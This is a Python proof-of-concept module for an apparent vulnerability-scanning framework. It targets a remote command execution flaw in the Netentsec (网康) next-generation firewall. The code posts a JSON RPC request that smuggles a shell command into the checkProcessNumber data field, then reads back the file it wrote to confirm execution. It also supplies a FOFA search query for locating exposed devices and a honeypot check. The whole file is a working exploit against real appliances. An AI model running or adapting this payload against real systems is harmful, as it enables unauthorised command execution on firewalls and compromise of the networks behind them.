# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "网康下一代防火墙 checkProcessNumber 远程命令执行",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="网康科技-下一代防火墙"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/directdata/direct/router" # url自己按需调整
        content_flag = random_str(20)
        filepath_flag = random_str(10,chars="str")
        data = """
{
    "action": "NS_Rpc_Common",
    "method": "checkProcessNumber",
    "data":[
"111\\"|echo %s>%s.txt|echo\\" a"
],
    "type": "rpc",
    "tid": 16
}
""" % (content_flag,filepath_flag)
        url1 = self.target + "/%s.txt" % (filepath_flag)

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
            if req0.status_code == 200 and "checkProcessNumber" in req0.text:
                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False,allow_redirects=False)
                if content_flag in req1.text and req1.status_code == 200:
                    vuln = [True,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()